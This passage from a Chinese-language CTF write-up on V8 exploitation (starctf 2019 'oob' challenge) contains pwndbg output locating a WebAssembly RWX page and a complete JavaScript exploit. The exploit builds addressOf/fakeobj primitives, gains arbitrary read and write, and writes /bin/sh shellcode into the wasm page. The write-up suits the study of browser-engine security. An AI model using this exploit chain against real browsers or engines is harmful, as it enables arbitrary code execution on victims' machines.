href="https://wasdk.github.io/WasmFiddle/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%BA%BF%E5%B0%86C%E8%AF%AD%E8%A8%80%E7%9B%B4%E6%8E%A5%E8%BD%AC%E6%8D%A2%E4%B8%BAwasm%E5%B9%B6%E7%94%9F%E6%88%90JS%E9%85%8D%E5%A5%97%E8%B0%83%E7%94%A8%E4%BB%A3%E7%A0%81%E3%80%82">https://wasdk.github.io/WasmFiddle/，这个网站可以在线将C语言直接转换为wasm并生成JS配套调用代码。</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> d = f();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] return from wasm: &quot;</span> + d);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/v8/out.gn/x64.debug$ ./d8 --allow-natives-syntax ./test.js</span></span><br><span class="line"><span class="comment">[*] return from wasm: 42</span></span><br><span class="line"><span class="comment">Trace/breakpoint trap (core dumped)*/</span></span><br></pre></td></tr></table></figure><p>在<code>js</code>代码中加入<code>wasm</code>之后，程序中会存在一个<code>rwx</code>的段，我们可以把<code>shellcode</code>放到这个段里面，再跳过去执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*利用job命令查看函数结构对象，经过Function--&gt;shared_info--&gt;WasmExportedFunctionData--&gt;instance等一系列调用关系，在instance+0x88的固定偏移处，就能读取到存储wasm代码的内存页起始地址</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">DebugPrint: 0x59fa561fab9: [Function] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3e43f7c44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x059fa5602109 &lt;JSFunction (sfi = 0xa1f9e548039)&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x1de519340c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - function prototype: &lt;no-prototype-slot&gt;</span></span><br><span class="line"><span class="comment"> - shared_info: 0x059fa561fa81 &lt;SharedFunctionInfo 0&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x1de519344ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - context: 0x059fa5601869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - code: 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - WASM instance 0x59fa561f8c1</span></span><br><span class="line"><span class="comment"> - WASM function index 0</span></span><br><span class="line"><span class="comment"> - properties: 0x1de519340c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x0a1f9e5404b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #name: 0x0a1f9e540449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #arguments: 0x0a1f9e540369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #caller: 0x0a1f9e5403d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561fa81</span></span><br><span class="line"><span class="comment">0x59fa561fa81: [SharedFunctionInfo] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x1de5193409e1 &lt;Map[56]&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x1de519344ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - function_map_index: 144</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - expected_nof_properties: 0</span></span><br><span class="line"><span class="comment"> - language_mode: sloppy</span></span><br><span class="line"><span class="comment"> - data: 0x059fa561fa59 &lt;WasmExportedFunctionData&gt;</span></span><br><span class="line"><span class="comment"> - code (from data): 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - function token position: -1</span></span><br><span class="line"><span class="comment"> - start position: -1</span></span><br><span class="line"><span class="comment"> - end position: -1</span></span><br><span class="line"><span class="comment"> - no debug info</span></span><br><span class="line"><span class="comment"> - scope info: 0x1de519340c61 &lt;ScopeInfo[0]&gt;</span></span><br><span class="line"><span class="comment"> - length: 0</span></span><br><span class="line"><span class="comment"> - feedback_metadata: 0x1de519342a39: [FeedbackMetadata]</span></span><br><span class="line"><span class="comment"> - map: 0x1de519341319 &lt;Map&gt;</span></span><br><span class="line"><span class="comment"> - slot_count: 0</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561fa59</span></span><br><span class="line"><span class="comment">0x59fa561fa59: [WasmExportedFunctionData] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x1de519345879 &lt;Map[40]&gt;</span></span><br><span class="line"><span class="comment"> - wrapper_code: 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - instance: 0x059fa561f8c1 &lt;Instance map = 0x3e43f7c49789&gt;</span></span><br><span class="line"><span class="comment"> - function_index: 0</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561f8c1</span></span><br><span class="line"><span class="comment">0x59fa561f8c1: [WasmInstanceObject] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3e43f7c49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x2aeb9878ac19 &lt;Object map = 0x3e43f7c4abd9&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x1de519340c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - module_object: 0x2aeb9878e411 &lt;Module map = 0x3e43f7c491e9&gt;</span></span><br><span class="line"><span class="comment"> - exports_object: 0x2aeb9878e681 &lt;Object map = 0x3e43f7c4ad19&gt;</span></span><br><span class="line"><span class="comment"> - native_context: 0x059fa5601869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - memory_object: 0x059fa561f9e9 &lt;Memory map = 0x3e43f7c4a189&gt;</span></span><br><span class="line"><span class="comment"> - table 0: 0x2aeb9878e619 &lt;Table map = 0x3e43f7c49aa9&gt;</span></span><br><span class="line"><span class="comment"> - imported_function_refs: 0x1de519340c71 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - managed_native_allocations: 0x2aeb9878e5c1 &lt;Foreign&gt;</span></span><br><span class="line"><span class="comment"> - memory_start: 0x7f85c0d80000</span></span><br><span class="line"><span class="comment"> - memory_size: 65536</span></span><br><span class="line"><span class="comment"> - memory_mask: ffff</span></span><br><span class="line"><span class="comment"> - imported_function_targets: 0x561c5e8f7100</span></span><br><span class="line"><span class="comment"> - globals_start: (nil)</span></span><br><span class="line"><span class="comment"> - imported_mutable_globals: 0x561c5e8f8480</span></span><br><span class="line"><span class="comment"> - indirect_function_table_size: 0</span></span><br><span class="line"><span class="comment"> - indirect_function_table_sig_ids: (nil)</span></span><br><span class="line"><span class="comment"> - indirect_function_table_targets: (nil)</span></span><br><span class="line"><span class="comment"> - properties: 0x1de519340c71 &lt;FixedArray[0]&gt; &#123;&#125;</span></span><br><span class="line"><span class="comment">pwndbg&gt; telescope 0x059fa561f8c1-1+0x88</span></span><br><span class="line"><span class="comment">00:0000│   0x59fa561f948 —▸ 0x1541e9fb6000 ◂— movabs r10, 0x1541e9fb6260 </span></span><br><span class="line"><span class="comment">01:0008│   0x59fa561f950 —▸ 0x2aeb9878e411 ◂— 0x7100003e43f7c491</span></span><br><span class="line"><span class="comment">02:0010│   0x59fa561f958 —▸ 0x2aeb9878e681 ◂— 0x7100003e43f7c4ad</span></span><br><span class="line"><span class="comment">03:0018│   0x59fa561f960 —▸ 0x59fa5601869 ◂— 0x1de519340f</span></span><br><span class="line"><span class="comment">04:0020│   0x59fa561f968 —▸ 0x59fa561f9e9 ◂— 0x7100003e43f7c4a1</span></span><br><span class="line"><span class="comment">05:0028│   0x59fa561f970 —▸ 0x1de5193404d1 ◂— 0x1de5193405</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">pwndbg&gt; vmmap 0x1541e9fb6000 #wasm code addr</span></span><br><span class="line"><span class="comment">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span></span><br><span class="line"><span class="comment">    0x1541e9fb6000     0x1541e9fb7000 rwxp     1000 0       +0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatArrayMap,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeobj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get shell</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + hex(f_addr));</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line">data_view.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">data_view.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), <span class="literal">true</span>);</span><br><span class="line">data_view.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), <span class="literal">true</span>);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>复现了蛮久的，细节还需要多理解。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://juejin.im/post/6844904096260947981#heading-2">https://juejin.im/post/6844904096260947981#heading-2</a></p><p><a href="https://changochen.github.io/2019-04-29-starctf-2019.html">https://changochen.github.io/2019-04-29-starctf-2019.html</a></p><p><a href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></p><p><a 